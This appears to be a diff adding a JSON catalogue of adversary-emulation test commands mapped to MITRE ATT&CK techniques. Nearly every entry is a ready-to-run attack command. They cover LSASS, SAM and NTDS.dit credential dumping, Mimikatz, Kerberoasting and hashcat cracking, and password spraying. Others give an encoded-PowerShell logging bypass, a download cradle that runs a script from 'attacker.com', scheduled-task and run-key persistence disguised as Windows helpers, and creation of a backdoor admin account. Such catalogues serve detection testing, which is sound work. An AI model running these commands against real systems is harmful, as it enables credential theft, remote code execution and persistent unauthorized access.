@@ -1,0 +1,212 @@
+[
+  {
+    "technique_id": "T1003.001",
+    "name": "Dump LSASS memory using ProcDump",
+    "description": "Dumps LSASS process memory using Sysinternals ProcDump to a file that can be parsed offline with Mimikatz.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp",
+    "cleanup_command": "del lsass_dump.dmp",
+    "dependencies": ["ProcDump from Sysinternals must be present at C:\\Tools\\procdump.exe"]
+  },
+  {
+    "technique_id": "T1003.001",
+    "name": "Dump LSASS memory using comsvcs.dll",
+    "description": "Uses the built-in Windows comsvcs.dll MiniDump export to dump LSASS memory without external tools.",
+    "platforms": ["Windows"],
+    "executor": "powershell",
+    "command": "$lsass = Get-Process lsass; $out = \"$env:TEMP\\lsass.dmp\"; rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump $lsass.Id $out full",
+    "cleanup_command": "Remove-Item \"$env:TEMP\\lsass.dmp\" -ErrorAction SilentlyContinue",
+    "dependencies": []
+  },
+  {
+    "technique_id": "T1003.001",
+    "name": "Mimikatz - Dump credentials from LSASS",
+    "description": "Uses Mimikatz sekurlsa::logonpasswords to dump credentials from LSASS memory.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+    "cleanup_command": "",
+    "dependencies": ["Mimikatz must be present", "Must run as Administrator"]
+  },
+  {
+    "technique_id": "T1003.001",
+    "name": "Dump LSASS with Task Manager",
+    "description": "Uses Windows Task Manager to create a dump of the LSASS process.",
+    "platforms": ["Windows"],
+    "executor": "manual",
+    "command": "1. Open Task Manager as Administrator\n2. Go to Details tab\n3. Right-click lsass.exe\n4. Select 'Create dump file'\n5. Dump is saved to %TEMP%\\lsass.DMP",
+    "cleanup_command": "del %TEMP%\\lsass.DMP",
+    "dependencies": ["Must run as Administrator"]
+  },
+  {
+    "technique_id": "T1003.001",
+    "name": "Dump LSASS using Windows Error Reporting",
+    "description": "Leverages Windows Error Reporting (WER) to create an LSASS dump via silent process exit.",
+    "platforms": ["Windows"],
+    "executor": "powershell",
+    "command": "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe' -Name 'MonitorProcess' -Value 'C:\\Windows\\System32\\notepad.exe' -Force; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe' -Name 'ReportingMode' -Value 1 -Force",
+    "cleanup_command": "Remove-Item 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe' -Force -ErrorAction SilentlyContinue",
+    "dependencies": ["Must run as Administrator"]
+  },
+  {
+    "technique_id": "T1003.002",
+    "name": "Dump SAM using reg.exe",
+    "description": "Exports the SAM registry hive to a file for offline password hash extraction.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "reg save HKLM\\SAM %TEMP%\\sam.hive && reg save HKLM\\SYSTEM %TEMP%\\system.hive",
+    "cleanup_command": "del %TEMP%\\sam.hive && del %TEMP%\\system.hive",
+    "dependencies": ["Must run as Administrator"]
+  },
+  {
+    "technique_id": "T1003.002",
+    "name": "Extract SAM hashes with Secretsdump",
+    "description": "Uses Impacket's secretsdump.py to remotely extract SAM hashes.",
+    "platforms": ["Linux"],
+    "executor": "bash",
+    "command": "python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL",
+    "cleanup_command": "",
+    "dependencies": ["Impacket must be installed", "SAM and SYSTEM hives must be available"]
+  },
+  {
+    "technique_id": "T1003.003",
+    "name": "Dump NTDS.dit using ntdsutil",
+    "description": "Uses ntdsutil to create a copy of the Active Directory database.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_dump\" q q",
+    "cleanup_command": "rmdir /S /Q C:\\Temp\\ntds_dump",
+    "dependencies": ["Must run on Domain Controller as Administrator"]
+  },
+  {
+    "technique_id": "T1003.003",
+    "name": "Dump NTDS using VSS shadow copy",
+    "description": "Creates a Volume Shadow Copy and copies NTDS.dit from it.",
+    "platforms": ["Windows"],
+    "executor": "powershell",
+    "command": "$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\\\\', 'ClientAccessible'); $id = $shadow.ShadowID; $vol = (Get-WmiObject Win32_ShadowCopy | where {$_.ID -eq $id}).DeviceObject; cmd /c copy \"$vol\\Windows\\NTDS\\ntds.dit\" C:\\Temp\\ntds.dit",
+    "cleanup_command": "Remove-Item C:\\Temp\\ntds.dit -Force -ErrorAction SilentlyContinue",
+    "dependencies": ["Must run on Domain Controller as Administrator"]
+  },
+  {
+    "technique_id": "T1558.003",
+    "name": "Kerberoasting with Invoke-Kerberoast",
+    "description": "Uses PowerSploit's Invoke-Kerberoast to request TGS tickets for all service accounts and output crackable hashes.",
+    "platforms": ["Windows"],
+    "executor": "powershell",
+    "command": "Import-Module .\\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File -FilePath .\\kerberoast_hashes.txt",
+    "cleanup_command": "Remove-Item .\\kerberoast_hashes.txt -ErrorAction SilentlyContinue",
+    "dependencies": ["PowerSploit must be available", "Valid domain user credentials required"]
+  },
+  {
+    "technique_id": "T1558.003",
+    "name": "Kerberoasting with Rubeus",
+    "description": "Uses Rubeus to request TGS tickets and output them in a crackable format.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt",
+    "cleanup_command": "del kerberoast_hashes.txt",
+    "dependencies": ["Rubeus.exe must be present", "Valid domain credentials required"]
+  },
+  {
+    "technique_id": "T1558.003",
+    "name": "Crack Kerberoast hashes with Hashcat",
+    "description": "Cracks extracted Kerberos TGS hashes using Hashcat with a wordlist.",
+    "platforms": ["Linux", "Windows"],
+    "executor": "bash",
+    "command": "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force",
+    "cleanup_command": "",
+    "dependencies": ["Hashcat must be installed", "kerberoast_hashes.txt must exist", "rockyou.txt wordlist"]
+  },
+  {
+    "technique_id": "T1110.003",
+    "name": "Password Spray with Spray",
+    "description": "Uses the Spray tool to perform a password spray attack against Active Directory.",
+    "platforms": ["Windows"],
+    "executor": "powershell",
+    "command": ".\\Spray.ps1 -UserList .\\users.txt -Password 'Summer2024!' -Domain corp.local -Delay 30",
+    "cleanup_command": "",
+    "dependencies": ["Spray.ps1 must be present", "users.txt must contain target usernames"]
+  },
+  {
+    "technique_id": "T1059.001",
+    "name": "PowerShell encoded command execution",
+    "description": "Executes an encoded PowerShell command to bypass script logging.",
+    "platforms": ["Windows"],
+    "executor": "powershell",
+    "command": "$cmd = 'Get-Process'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); powershell.exe -EncodedCommand $encoded",
+    "cleanup_command": "",
+    "dependencies": []
+  },
+  {
+    "technique_id": "T1059.001",
+    "name": "PowerShell download cradle",
+    "description": "Downloads and executes a PowerShell script from a remote server.",
+    "platforms": ["Windows"],
+    "executor": "powershell",
+    "command": "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
+    "cleanup_command": "",
+    "dependencies": ["Network access to attacker server"]
+  },
+  {
+    "technique_id": "T1046",
+    "name": "Network scanning with nmap",
+    "description": "Performs a TCP SYN scan to discover open services on a target subnet.",
+    "platforms": ["Linux", "Windows", "macOS"],
+    "executor": "bash",
+    "command": "nmap -sS -p 22,80,443,445,3389,8080,8443 --open -oN scan_results.txt 192.168.1.0/24",
+    "cleanup_command": "rm -f scan_results.txt",
+    "dependencies": ["nmap must be installed", "Appropriate network access to target subnet"]
+  },
+  {
+    "technique_id": "T1046",
+    "name": "Network scanning with PowerShell",
+    "description": "Uses PowerShell to perform a basic port scan without external tools.",
+    "platforms": ["Windows"],
+    "executor": "powershell",
+    "command": "1..1024 | ForEach-Object { $port = $_; Try { $tcp = New-Object Net.Sockets.TcpClient; $tcp.Connect('192.168.1.1', $port); \"$port OPEN\"; $tcp.Close() } Catch {} }",
+    "cleanup_command": "",
+    "dependencies": []
+  },
+  {
+    "technique_id": "T1021.002",
+    "name": "Mount administrative share with net use",
+    "description": "Uses net use to connect to a remote admin share for lateral movement.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "net use \\\\TARGET-PC\\C$ /user:DOMAIN\\Administrator P@ssword123",
+    "cleanup_command": "net use \\\\TARGET-PC\\C$ /delete",
+    "dependencies": ["Valid admin credentials", "SMB access to target"]
+  },
+  {
+    "technique_id": "T1053.005",
+    "name": "Create a scheduled task for persistence",
+    "description": "Creates a scheduled task that runs a payload on user logon for persistence.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "schtasks /create /tn \"Windows Update Helper\" /tr \"C:\\Temp\\payload.exe\" /sc onlogon /ru System /f",
+    "cleanup_command": "schtasks /delete /tn \"Windows Update Helper\" /f",
+    "dependencies": ["Must run as Administrator", "Payload must exist at specified path"]
+  },
+  {
+    "technique_id": "T1547.001",
+    "name": "Add registry run key for persistence",
+    "description": "Adds a registry run key to execute a payload on every user login.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"WindowsHelper\" /t REG_SZ /d \"C:\\Temp\\payload.exe\" /f",
+    "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"WindowsHelper\" /f",
+    "dependencies": []
+  },
+  {
+    "technique_id": "T1136.001",
+    "name": "Create a local admin account",
+    "description": "Creates a new local administrator account for persistent access.",
+    "platforms": ["Windows"],
+    "executor": "command_prompt",
+    "command": "net user attacker P@ssword123 /add && net localgroup administrators attacker /add",
+    "cleanup_command": "net user attacker /delete",
+    "dependencies": ["Must run as Administrator"]
+  }
+]
